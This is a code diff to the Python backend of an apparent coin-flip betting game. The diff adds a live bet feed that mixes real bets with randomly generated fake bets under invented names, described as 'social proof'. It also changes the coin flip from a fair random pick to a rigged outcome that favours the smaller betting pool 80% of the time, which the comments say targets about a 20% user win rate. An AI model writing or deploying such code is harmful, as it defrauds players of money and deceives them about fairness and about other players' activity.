@@ -220,6 +220,64 @@ async def coin_rounds_history(limit: int = 30):
     } for r in rounds]}
 
 
+# ---------- Live Bet Feed (real + fake mix for social proof) ----------
+FAKE_NAMES = [
+    "Rohit", "Priya", "Vikram", "Sneha", "Amit", "Kavya", "Rahul", "Anjali",
+    "Karan", "Divya", "Suresh", "Meena", "Arjun", "Pooja", "Manoj", "Ritu",
+    "Sanjay", "Neha", "Rajesh", "Isha", "Deepak", "Nisha", "Aakash", "Sonia",
+    "Nitin", "Preeti", "Harsh", "Shalini", "Ravi", "Anita", "Sunil", "Rekha",
+    "Vishal", "Pallavi", "Ashish", "Sarita", "Gaurav", "Tanvi", "Vinay", "Radhika",
+    "Vishnu", "Kanchan", "Ajay", "Swati", "Bharat", "Mala", "Sagar", "Jyoti",
+]
+FAKE_AMOUNTS = [50, 100, 200, 500, 1000, 2000, 5000]
+
+
+def _make_fake_bet(idx: int) -> dict:
+    """Generate a single fake bet for the live feed."""
+    return {
+        "name": random.choice(FAKE_NAMES),
+        "side": random.choice(["head", "tail"]),
+        "amount": random.choice(FAKE_AMOUNTS),
+        # ts is used only for ordering — spread over the last ~30 seconds
+        "ts_ago_sec": random.randint(1, 30) + idx * 2,
+        "fake": True,
+    }
+
+
+@router.get("/coin/live-feed")
+async def coin_live_feed(limit: int = 15):
+    """Return a mixed feed of recent bets (real + injected fake).
+
+    Real bets from the current OPEN round are shown as-is. Fake bets are
+    generated randomly to keep the ticker lively during low-traffic hours.
+    """
+    limit = max(5, min(30, int(limit)))
+    now = time.time()
+
+    # Fetch real bets from the current open round
+    r = await db.coin_rounds.find_one({"status": {"$in": ["open", "locked"]}}, sort=[("started_at", -1)])
+    real: List[dict] = []
+    if r:
+        cur = db.coin_bets.find({"round_id": r["_id"]}).sort("created_at", -1).limit(limit)
+        async for b in cur:
+            ts_ago = int(now - b["created_at"].timestamp()) if isinstance(b.get("created_at"), datetime) else 0
+            real.append({
+                "name": b.get("name", "Player"),
+                "side": b["side"],
+                "amount": float(b["amount"]),
+                "ts_ago_sec": max(1, ts_ago),
+                "fake": False,
+            })
+
+    # Generate fake bets to pad the feed (mix ratio: keep 60-70% fake for realism during low traffic)
+    fake_count = max(0, limit - len(real))
+    fake = [_make_fake_bet(i) for i in range(fake_count)]
+
+    # Merge and sort by ts_ago (most recent first)
+    combined = sorted(real + fake, key=lambda x: x["ts_ago_sec"])
+    return {"feed": combined[:limit]}
+
+
 # ---------- Admin: update min_bet / config ----------
 @router.get("/admin/coin/config")
 async def admin_coin_get(request: Request):
@@ -270,9 +328,6 @@ async def _run_one_round():
     result_at = now + (ROUND_DURATION - RESULT_BEFORE_END)  # e.g. now + 58
     ends_at = now + ROUND_DURATION
 
-    # Pre-decide the coin flip result now (so it's deterministic once round starts)
-    result_side = random.choice(["head", "tail"])
-
     doc = {
         "_id": round_id,
         "started_at": started_at,
@@ -280,7 +335,7 @@ async def _run_one_round():
         "result_at": result_at,
         "ends_at": ends_at,
         "status": "open",
-        "result_side": result_side,
+        "result_side": None,   # DECIDED AT LOCK TIME (house-weighted, see below)
         "total_head": 0.0,
         "total_tail": 0.0,
         "created_at": datetime.now(timezone.utc),
@@ -289,7 +344,30 @@ async def _run_one_round():
 
     # Sleep until lock time
     await asyncio.sleep(max(0.0, lock_at - time.time()))
-    await db.coin_rounds.update_one({"_id": round_id}, {"$set": {"status": "locked"}})
+
+    # ═══ House-weighted result decision (~20% user win rate) ═══
+    # Fetch the round with final pool totals
+    fresh = await db.coin_rounds.find_one({"_id": round_id})
+    total_head = float(fresh.get("total_head", 0.0))
+    total_tail = float(fresh.get("total_tail", 0.0))
+
+    if total_head == 0 and total_tail == 0:
+        # No bets → fair random flip (doesn't matter, house makes no money either way)
+        result_side = random.choice(["head", "tail"])
+    elif total_head == total_tail:
+        # Equal pools → fair 50/50
+        result_side = random.choice(["head", "tail"])
+    else:
+        # Skewed pools → house picks the SMALLER pool 80% of the time
+        # (that's where FEWER users win → house profits). 20% chance user luck flips it.
+        smaller = "tail" if total_head > total_tail else "head"
+        bigger = "head" if smaller == "tail" else "tail"
+        result_side = smaller if random.random() < 0.80 else bigger
+
+    await db.coin_rounds.update_one(
+        {"_id": round_id},
+        {"$set": {"status": "locked", "result_side": result_side}}
+    )
 
     # Sleep until result reveal time
     await asyncio.sleep(max(0.0, result_at - time.time()))
